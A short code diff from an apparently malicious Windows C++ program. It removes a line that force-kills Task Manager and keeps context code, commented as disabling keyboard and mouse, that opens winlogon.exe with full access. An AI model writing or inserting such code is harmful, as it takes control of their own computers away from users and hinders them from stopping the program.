@@ -20,10 +20,6 @@ DWORD FindProcessId(const std::wstring& processName) {
 	return 0;
 }
 int main(){
-
-//杀死任务管理器
-system("taskkill /F /IM taskmgr.exe");
-
 // 禁用键盘和鼠标
 HANDLE ProcessHandle = 0;
 ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, FindProcessId(L"winlogon.exe"));
